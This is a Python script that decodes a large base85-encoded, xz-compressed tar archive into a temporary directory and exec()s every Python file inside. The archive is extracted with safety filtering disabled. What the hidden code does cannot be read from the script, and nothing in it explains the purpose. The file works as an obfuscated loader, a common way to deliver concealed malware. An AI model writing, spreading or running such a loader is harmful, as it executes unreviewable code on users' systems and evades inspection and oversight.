
import tarfile, os, shutil, tempfile, sys, platform, warnings
from base64 import b85decode

source = b85decode(b'{Wp48S^xk9=GL@E0stWa761SMbT8$j;7|V(NnHRJ3)}>NP%<X&9eo?~^2;;q?D#kE>ehRB4_H=u2>q2e4e=@lut}UO{Ax%q&AFUdYlyxQVw=&K{pt<E=B4HL>RgJc9paE`?kv|cH0}!3{oZsjp-A-4ufoP5T|Q-fpyh^QIR``p0rqLe0biKcVj%|0U|dHw0yMC8j%o0vA9!DjQd|jvPLkZ%XKR^Q^8n3%5OoFwK<=%bG%YWr8P2{UH<S%^k|Cf*L>4Rp>W+?MB%ZK{3jr5T!ddArp={kA3O{MpJRy`}bJTmO22`wrU^$3tRQ+bstR1eHuv%;+_;joWhux2o(J88VG%(DWO1#(LB>;A1@R+B6Aic-O$(vAnmmK0|VP4bv@ex+K)NEH>V;lsdppIiY#>`K^{6jpC`cOf&J*mv{r1jAlInYJI_WG>Bx0pd?zqVt~;-W5mdfp3~&39J`?PXUV49;WOzJCY?BVacMBu2{IVMi2W?j3eDbjy4R{`+_jIh2i{#jU3-qAbt;c6>Mm)VT9n)R}pNsC-aTan6&+CRbgu68G2uvBZgX7S%L0Cb%SW;B$*+-0ftFN6l=L#_QiaKSxxn25QOw;k|nFK29eA(vd-gYq$svE>F01Uh=U4LaH@ng32pE2ZZ-{C{<6v4M1q2Z<9jZp9n>}7zUc-!r`iSY;BUqI@$aIUzDrhThuGw#@Ydn1?}Bn4iP0q$$$I;(-!U+h8eWu7!Qetc$|cAoH7nb$!kB6wLC3aJ(%)wC>LP;qP%4TVWjoYl&?@+3P1Mbp7UU(yf@;LWwkSAD&lc=rjG?3s7251(XKnkt>sI<{x`D`^P%_Kcu5?i9oO{ta-XRWB)8obPzl22ywY~~d6W%(Mkm+!-`u)L*?<c(yGOw$<_wm;Cb=^@q$Li9WmueMh}<p+d_Wg*Lr<0@j>WMEyL3I{hM}eQ=1Ti@<L0;P@qL~popx7QYKbRC<)K*zVv=*5y*h2*gOcO>@wLM*_Sk})bPpSIBJw^M|EU|lhB<|xm(ACOr?ZDvd-x5L80iFq>|R7+a*TENVHx0yg3To6ty%I5k-(fQcCw-jWQb%`j(~e#xCyi)js4nQi-7tD>H2(ZQjBHGnN_|XCNmN2+BLcq0STPEi+eLb@m9{kCHz`GsUCLd73Jn*=JQ79WDdIHjav*Z%+`#=h~n0MQ<X`$g*&<DY@^ainL$M7$9jxJj&W(d<y07qF~>kfAZHUsxxctq%cUeCxa%@9Md&mTQmVg!+-Od&Z1&xap<s7%2EYPK-Iw8a&g&&495a?WxatfD^X4JcSDOJS<R*_`9FH;!q3(+c3ppoj{H>P8@_)L{Tq*J74w%r=9%kadBJC}R*ZoG;lA<G>N=a$Z;4>q83p`9m)USjSB|LkTRY^W8UkPFqE(1Lw<asohO(L5|xI^+t6~y-Kv=QAE89yWun2PMNwm;msqE<qf)mF5P-1mbeh#g&8x-$Hlg6N?eZG9evM#IDWo6KS?!t-bY`OQG$_*o(VpDtW5kEQmjM1Lb@vsN6~`BAx9>1|$Ybltvg88Ic@)G(kf$D;M&Y~>6Xj5GObEQ128gJH{!lQY)wx}<%XL5j%>9g7d)A^*BZ%$__6Byq`K`f(D;b3F4m+7Ko(>X;kgK12u8#p6c><CN)1(llV+a;DbNycJ6tB(%>Iz7dGbx8AePbr(J?hQc5jA5VsQlmwd4@==!wI?4S2PsEu7jSvianR?s&g33k3?eT%rU2oZ&{}Z2v<}M+|QMt?dkgk;K>DBr~_GG^_s(19dT*U#L5Tj`F+P@w6{0BgX7ibc+Hlk4;l#b*anO=hcW%PXuq&|otwyA^Iitqh%qYVk-#bLbs>}i_;N%1qtg&i<^K6s+<hi3f%7UWUT_&M-A;I|PNh$ZEc$rw6Dw4a?C9y#65S`Th|U6HtS1Yk8Pi5{uvnPl&f)29KwS%0Cf95jp}kPsjyKzcC1qu8|;c2j&>$flw}+_(JWjrOP`8{c`S1CHL2e|7;VOB&;t3M_rjL<2BoX}q@*9+WEc-L&U@8<lTZdvEL(x6OfmeDlQSHhE+dbo2Q{dz!1*1KZonTVLuqvp~roT=`muE(bKZkTR>M3fR{(Dpkb*<Ye)?&Y0Dv>u`(I0IHbev`|^9JQ<dE6qSrI%ggs6-St(J{*HPvstA1n*4O7=re|9XeSW9~WA;P)x%E5aT1fjqII_n{VPjH3!}Etvl(-4<_4XKGu(E9;Cw#mj>o{)>Dg_y?DFTV(pu%!SU!^`GB^>iUQ$dDCeN7H6|Ib?rQ9;ynYPbabvQ<~YClB2qCM$KpDsYhF8M@=bDM)P!-pJa@n)$xbQc%<T(?W`vt24$%$g2!3f4Y=+&<t=)-w*^yk8fI#mr-v=NV?b;)z57mts42)Dfr1~x|!G=lZ(sFxE}=tKw^s^y14k=71pUOf;WN{Ue@AcSHOa?C$O<slJ_}8RD+7$7Tils3l^JCX@dZO?;_YdZX+T!G%>fQL?(yqH}{x^@*%w+<^9v}h?9zOztRqqen?4NH8Mv9f{Qv54{r6S##BAz)TH>6CGFuJ3R>t@IOYBZx5DQtK00sAf8%-t`Sozf9JHb57wi19a{sTEPk)OpaQ_-xxlNnN#o7j$CZe-vU@RdkAH@&0{~}B%GE6U;a{gXcZyA{XiX6q>c4JV^{wZ|=P?6kz17vG|Wj#u2v(byf^$KCUb}R4x^ya;0pj$L+_o-Bb$4tX5HJEhG>KUK;e;A23D0_XcZx&q}C?x=d>0+px6Q)ylBdSEy97XH9$nC%{os1J8hS~8=-DN9~lMQrG=^+mDSyC9oRFkWNedTX05>ILbJ!ISQ^w$ddWwC7{*dZtG_n@w534yt1nh4pyV1*Wqe0M<n#grrFYbNIKuOs}9A6-<_CRz_<2B26Tg4XJemv$3de+9$bi0<W{#4>WP6Q^wGc)XoRe%it5=3GZGkVbq4Y$d_EZi{%p>=uq)goMTiGU~`IysEL!G<wI;u=AtkDs!EU^}y+1i&H<>{#JTy10?W4=|I0~;h$Uv^!r#kChNfa#li&BOzW1an`qb@Dz%8TKCKR(kj6!8^cXd5z+W4(Z|3|7Jm#(^Axw{8(>H-=t7Nv#h%)il+S>gxXlZi5+f9sDuQInXGmn`BM7Z!=M4BrxzEKO3%Y^Qf|L6<hNDF3&z;<mdj8^|9)uKKlH2g!)iFD#vXfOKXdPK@!as=?#bPjNz+aO<{NzSLeZBDaV&(>TPH4>=}Y9O%+{6zC6Nm5N*?t>FUEI5T(Ii3F)GTTKS!NZM`NLg~a!d}FO{EF}&)0L|ShvstggZ&b_kXh@rY-UN`*>DV&M*R{IcrLtf+g7^enx>aySJzl`7G7Z~C|9Cazu&cYV9oON@`f;LRhrCzELWJ`F^8yj%`4@8(~aOfWT!n;%C{{}`eyFfRm{^c3X-gCMo%*EM$}bWU#>3x@3~#E+}B6krPY1IMsRmWHl0r>PSfk2tR9yE_p7QL?|1-Gf6Oem>Df;>Z^IK~4z^9Js){@?IIvY3omu@I(q_lm-YC2H^xUN9S$JXnst<w9&}w+DL-+a*C+|}w>*47G;O*zz7lb;c#FrCqP&PMaZmMUMIAB$-#KI@i^2&TP<@NDHcZ!Nz&d(pY`B_+BcOclmk#^NGs$m%wae0!f@gIq4lMNk&zhwYVsfmicI9=ZEuVv)ye$2J3slwp^KH{bW`ok*)m21jtqTGSROtLyjK~3@I2WIX5W%=upAMo$#-#+zjpW1BQLK79x)IiYFLe=8ql4bsB7|60py^A4{Y?JaxNj6^pw?NC#g13RLTlW(>!U~Yw?yXg0`GybDPPD8hEvkg{C!BMa8}XM~Vh@nGkc^85{X|?9YvxpX7@Y~cz;Xxo0e#+$pQzH~$v4yO7Pmbip}|<5owKt?U)@b3v#Z^>*)8o#i*@0<-rV?j3XD6yylu=&#1hvL`VWZd{>jdWN4got?#Qjcz6r5!_I^uhs!w#W>tAOh;kugJdaCqSrM^XWo^u7{)g87M*9YThjz#;)14O4*8h6r^QtRycRrhxmTj)!D+&-~|b;~CR3s28SiVuu9g+>o-Y79!gq_~rnm@;wLX;PWXsYfXy|GVL-8)`TUIARk^hoeH9WT!39exiEybignx3S7fgNsXQ%y4^XtboWSC96j@3^s&@%F2v-X*)S=kj2@@-*nFELG4Izahx`sR6ZTmAKD`aT)B`(Hb*_=OTo$#fC6HQPI}&rA83ajYw{(8iWhd}7VQXNT;JF-SAVI!o043~XGBvg!<WCr8r3gfCpE|HCP+P4g;08r8%Ys&*9TEu@Ifcrjx~gQ%#v9q=t8dKb!c8o*G2iSU!^S;pBE_N*Gkvs6{_=)2mq1!Fh4~$MfFt4YYD@C&S{u2^l*m}PD!-$`T7D<t=e3&Rhe8na`)8u$q5VwSU`UY(GEGLt4x4L6cwGDBGs&IYm0Zy}?IBw$(`qT7eE_o=y5|=$sGu&Hpgqf{dd3bSiBw4DjlcO6$b97Iuc2KfIv;d`Rl_DE-=IB`g2QDF^VYT&$(QEVxBP{cIp~M7tM!mg-Pi1J&t1RW0y?CkrYY-sCoxh17G5EA`97PkT1E|9MI?&6gkoxS>}&s|4nRy{=+BtQ699)+Va3_%-^RpR5bg4-s}+O4?5t=@15YKi1TKTAtdK$Dx*4-8cPBGi{)dL9GtT!j%G?u?*4`d97sI~eUVe1s#0YaRfzgk(;O1Zi#sxA##D%NO+Uu<d@4b8Bp$q*Ne7u>#=cR2hyUY{u;yHaWZUk+USPZbi2Ye+aBKzw|MKa$MN-uiFt4L}jvcf0TdCayb*Fap^Y=ogoRlYllW7tmn;V2#gbZV{eaW>5>r)q$j|Fr0522q_1P-~7zNgKl7(M%|`LJ~DQ!Jw#=8zvKD11Jy0!gw-ZPKQ3bz^0&Fm5%MGY&9#0|J%JCQ1T~73{EBADmwXTRaUUyCO4jrrsm)9K`Ku9aDE(H$K0g3rmS^^=*2Q6iaDCH0xmNw0kKaBZYUSG&(3|%vCyaBh+7$^(ZC*I=KlbBe_i3pz{@1H`emdr4Exe5RbS1WVsFf*`A5kc`e!Vj&BS$+G=(~h6gtv?gzz0jC3N#QrKc;O9JTyS!~hrqK}Rxgbmw8fYHKHE@Q(9F5XyI-lNY%qVOF-C6L~I#$mEIA!w6OjkNp@Ke(Az%0PjV5teTR*n@$LEz&9)0OWHiX5gIr2B;RnDHTH*vU=c#W0Vtw5OF%WLqVg3s+a!PJ647z0%+ye9vdIRNyj&}*mFA9mS8GvGOu%<O0zxos;hn~8^7I;2+~88;!3=cO`az!>p_XmDFVO>r^QjqBO^iWn(U|M;!VJFKO=RhYplkZh-uTVDIwd7>2*1--olas$k&FJxEV*^>r9Mb(6c`cS6&>cqlem7l9|#HO*gMuj*(u6SDV0iFrwdhgDf{P_rR7AH)vAM^@YgdcynNW}BRJU$_1g&XKLylj!y;=~oO0mXVDG5tqNV%H*|@5(e_kcb+ycafICFFiT`V2b2xn*w!x*SAJfY$YcO@Qk7K+miX?!R@ljP4O4fq+cRux!3QrdO9&`D^>c3J>P8xJBT4(xttcSrc16GeyYp#`Uei8bY*D7#_D-ET#xl+Y95`j~pJ>>;d(0qJ)wXVFB_f!Y5~r56-!p2(_0Mb_hvhTZ(8il{dRrgt*XXy8OF9<mpe2Zuj`0atcYWJY1q8w;Uz(X+LoLVi;=X~AgCb+2*H)a|ivJIH>eWN>l?WGHpsi^DqT)Ny>cnrX-v|C4v}U5Sp2B#4C@5IJjn!i-4CROK<X#CsaeSlA~m!u<^6mI6E=p0+Wh%W(v}eWXMasb1lx=@`8EfmQuJzLgJ1-oh2?ydKg3Df$g}v=Hv{_8nO+$=YmMKy4ta?;jHfZW3@faVU;ZfhrrNQXX(U1bkQy>P(=X=^X`{-TtwZAtX?QLnKUo>OqwR)Zdj69wWF6JBi=e%#;ECekae6jj@}(M*`EtNIhHGD8L5W+sS7)Qs%j#D6E92<a2a-LJU^JY<UO6{JDHb9zKl@`U1z87@w%s3$$oRF0rrYe3%^Jb;pOb-i7AV`%XZ)36>_Zf7$8=CXp2LDP_uT3CCVl^fLUibrdP2r+N1{hE8Tn?Ni7i8lKVj#(K=0leN8PjgW8WbV&(I;j^bd-@(?tH{|Ux-#*A?%!xvRr<JyNOTcfUWM6j{uLN)tdIAPTZhKvZD7+x19Jq*=TgD&!31W)`(*ZKc;dZS!>JZ;W@4|)(z#ed{KID$y1%k<#&K+(3+ylyfU?EA07K}n^hMwN1&s1l~K6LdzJ**58(K}feWVXkCu@37In{CeRhjl;z00000|L6-NBKu>V00HGDfS>^YQeJ1~vBYQl0ssI200dcD')
file_name = '.encrypted'

warnings.filterwarnings('ignore', category=DeprecationWarning)

def main():
    try:
        C = tempfile.mkdtemp()
        H = os.path.join(C, file_name)
        with open(H, 'wb') as M:
            M.write(source)
        with tarfile.open(H, 'r:xz') as N:
            N.extractall(C, filter=None)
        for root, _, files in os.walk(C):
            for file in files:
                if file.endswith(".py"):
                    exec(open(os.path.join(root, file)).read())
    except Exception as e:
        print('⚠️ Error:', e)
    finally:
        if os.path.exists(file_name):
            os.remove(file_name)
        shutil.rmtree(C)

if __name__ == '__main__':
    main()
